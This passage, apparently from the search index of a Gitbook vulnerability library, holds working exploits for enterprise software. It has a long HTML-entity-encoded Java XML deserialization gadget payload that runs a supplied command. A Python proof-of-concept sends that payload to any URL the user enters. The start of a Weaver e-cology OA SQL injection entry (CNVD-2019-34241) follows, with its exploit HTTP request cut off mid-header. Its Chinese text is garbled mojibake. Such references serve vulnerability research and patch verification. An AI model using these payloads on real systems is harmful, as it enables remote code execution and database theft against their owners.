&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x32;&#x63;&#x65;&#x72;&#x74;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x68;&#x61;&#x73;&#x68;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x65;&#x73;&#x20;&#x64;&#x65;&#x66;&#x69;&#x6e;&#x65;&#x64;&#x2d;&#x69;&#x6e;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x6c;&#x61;&#x6e;&#x67;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x44;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x72;&#x69;&#x6e;&#x63;&#x69;&#x70;&#x61;&#x6c;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x68;&#x61;&#x73;&#x41;&#x6c;&#x6c;&#x50;&#x65;&#x72;&#x6d;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x68;&#x61;&#x73;&#x41;&#x6c;&#x6c;&#x50;&#x65;&#x72;&#x6d;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x50;&#x65;&#x72;&#x6d;&#x69;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x73;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x50;&#x65;&#x72;&#x6d;&#x69;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6b;&#x65;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6b;&#x65;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x44;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x3e;&#x0a;&#x3c;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x24;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x53;&#x65;&#x74;&#x22;&#x20;&#x73;&#x65;&#x72;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x63;&#x75;&#x73;&#x74;&#x6f;&#x6d;&#x22;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x5f;&#x2d;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x73;&#x65;&#x74;&#x22;&#x3e;&#x3c;&#x2f;&#x63;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6d;&#x75;&#x74;&#x65;&#x78;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x24;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x53;&#x65;&#x74;&#x22;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x22;&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x2f;&#x2e;&#x2e;&#x22;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x5f;&#x2d;&#x53;&#x79;&#x6e;&#x63;&#x68;&#x72;&#x6f;&#x6e;&#x69;&#x7a;&#x65;&#x64;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x73;&#x3e;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6e;&#x61;&#x74;&#x69;&#x76;&#x65;&#x4c;&#x69;&#x62;&#x72;&#x61;&#x72;&#x69;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x61;&#x73;&#x73;&#x65;&#x72;&#x74;&#x69;&#x6f;&#x6e;&#x4c;&#x6f;&#x63;&#x6b;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x41;&#x73;&#x73;&#x65;&#x72;&#x74;&#x69;&#x6f;&#x6e;&#x53;&#x74;&#x61;&#x74;&#x75;&#x73;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x41;&#x73;&#x73;&#x65;&#x72;&#x74;&#x69;&#x6f;&#x6e;&#x53;&#x74;&#x61;&#x74;&#x75;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x67;&#x6e;&#x6f;&#x72;&#x65;&#x64;&#x5f;&#x5f;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x6a;&#x61;&#x76;&#x61;&#x78;&#x2e;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x73;&#x75;&#x6e;&#x2e;&#x3c;&#x2f;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x67;&#x6e;&#x6f;&#x72;&#x65;&#x64;&#x5f;&#x5f;&#x70;&#x61;&#x63;&#x6b;&#x61;&#x67;&#x65;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x72;&#x65;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x6f;&#x72;&#x79;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x6f;&#x72;&#x67;&#x2e;&#x61;&#x70;&#x61;&#x63;&#x68;&#x65;&#x2e;&#x62;&#x63;&#x65;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x53;&#x79;&#x6e;&#x74;&#x68;&#x65;&#x74;&#x69;&#x63;&#x52;&#x65;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x6f;&#x72;&#x79;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x61;&#x74;&#x68;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x2e;&#x3c;&#x2f;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x5f;&#x5f;&#x70;&#x61;&#x74;&#x68;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x5f;&#x5f;&#x6c;&#x6f;&#x61;&#x64;&#x65;&#x64;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x65;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x72;&#x65;&#x70;&#x6f;&#x73;&#x69;&#x74;&#x6f;&#x72;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x65;&#x72;&#x54;&#x6f;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x73;&#x75;&#x6e;&#x2e;&#x6d;&#x69;&#x73;&#x63;&#x2e;&#x4c;&#x61;&#x75;&#x6e;&#x63;&#x68;&#x65;&#x72;&#x24;&#x45;&#x78;&#x74;&#x43;&#x6c;&#x61;&#x73;&#x73;&#x4c;&#x6f;&#x61;&#x64;&#x65;&#x72;&#x27;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x2f;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x70;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x6f;&#x72;&#x43;&#x4c;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x74;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x74;&#x79;&#x70;&#x65;&#x3e;&#x4b;&#x45;&#x59;&#x53;&#x3c;&#x2f;&#x74;&#x79;&#x70;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x6e;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x42;&#x79;&#x74;&#x65;&#x41;&#x72;&#x72;&#x61;&#x79;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x62;&#x75;&#x66;&#x3e;&#x3c;&#x2f;&#x62;&#x75;&#x66;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x70;&#x6f;&#x73;&#x3e;&#x30;&#x3c;&#x2f;&#x70;&#x6f;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6d;&#x61;&#x72;&#x6b;&#x3e;&#x30;&#x3c;&#x2f;&#x6d;&#x61;&#x72;&#x6b;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x30;&#x3c;&#x2f;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x69;&#x73;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6e;&#x73;&#x75;&#x6d;&#x65;&#x64;&#x3e;&#x66;&#x61;&#x6c;&#x73;&#x65;&#x3c;&#x2f;&#x63;&#x6f;&#x6e;&#x73;&#x75;&#x6d;&#x65;&#x64;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x61;&#x74;&#x61;&#x53;&#x6f;&#x75;&#x72;&#x63;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x74;&#x72;&#x61;&#x6e;&#x73;&#x66;&#x65;&#x72;&#x46;&#x6c;&#x61;&#x76;&#x6f;&#x72;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x61;&#x74;&#x61;&#x48;&#x61;&#x6e;&#x64;&#x6c;&#x65;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x61;&#x74;&#x61;&#x4c;&#x65;&#x6e;&#x3e;&#x30;&#x3c;&#x2f;&#x64;&#x61;&#x74;&#x61;&#x4c;&#x65;&#x6e;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x20;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6e;&#x63;&#x65;&#x3d;&#x27;&#x2e;&#x2e;&#x2f;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x3c;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x3e;&#x0a;&#x3c;&#x2f;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x3e; 2 '''.format(cmd=cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) if \"VulTest\" in response.text and response.status_code == 500: print(\"\\033[36m[o] Â≠òÂú®ÊºèÊ¥û \\n[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA WorkflowCenterTreeDataÊé•Âè£SQLÊ≥®ÂÖ•.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/Ê≥õÂæÆOA/Ê≥õÂæÆOA WorkflowCenterTreeDataÊé•Âè£SQLÊ≥®ÂÖ•.html","title":"Ê≥õÂæÆOA WorkflowCenterTreeDataÊé•Âè£SQLÊ≥®ÂÖ•(‰ªÖÈôêoracleÊï∞ÊçÆÂ∫ì)","keywords":"","body":"Ê≥õÂæÆOA WorkflowCenterTreeDataÊé•Âè£SQLÊ≥®ÂÖ•(‰ªÖÈôêoracleÊï∞ÊçÆÂ∫ì) CNVD-2019-34241 ÊºèÊ¥ûÊèèËø∞ 2019Âπ¥10Êúà10Êó•CNVDÂèëÂ∏É‰∫ÜÊ≥õÂæÆe-cology OAÁ≥ªÁªüÂ≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇËØ•ÊºèÊ¥ûÊòØÁî±‰∫éOAÁ≥ªÁªüÁöÑWorkflowCenterTreeDataÊé•Âè£‰∏≠Ê∂âÂèäOracleÊï∞ÊçÆÂ∫ìÁöÑSQLËØ≠Âè•Áº∫‰πèÂÆâÂÖ®Ê£ÄÊü•Êé™ÊñΩÊâÄÂØºËá¥ÁöÑÔºå‰ªªÊÑèÊîªÂáªËÄÖÈÉΩÂèØÂÄüSQLËØ≠Âè•ÊãºÊé•Êó∂Êú∫Ê≥®ÂÖ•ÊÅ∂ÊÑèpayloadÔºåÈÄ†ÊàêSQLÊ≥®ÂÖ•ÊîªÂáª„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] ‰ΩøÁî®OracleÊï∞ÊçÆÂ∫ìÁöÑÊ≥õÂæÆÊúçÂä° ÊºèÊ¥ûÂ§çÁé∞ Ê≥õÂûãÂæÆÁîüÊÄÅOAÁ≥ªÁªüÁöÑWorkflowCenterTreeDataÊé•Âè£Âú®‰ΩøÁî®OracleÊï∞ÊçÆÂ∫ìÊó∂ÔºåÁî±‰∫éÂÜÖÁΩÆsqlËØ≠Âè•ÂàÜËß£‰∏ç‰∏•ÂØÜÔºåÂØºËá¥ÂÖ∂Â≠òÂú®ÁöÑsqlÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûËØ∑Ê±ÇÂåÖ POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1 Host: ip:port Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: 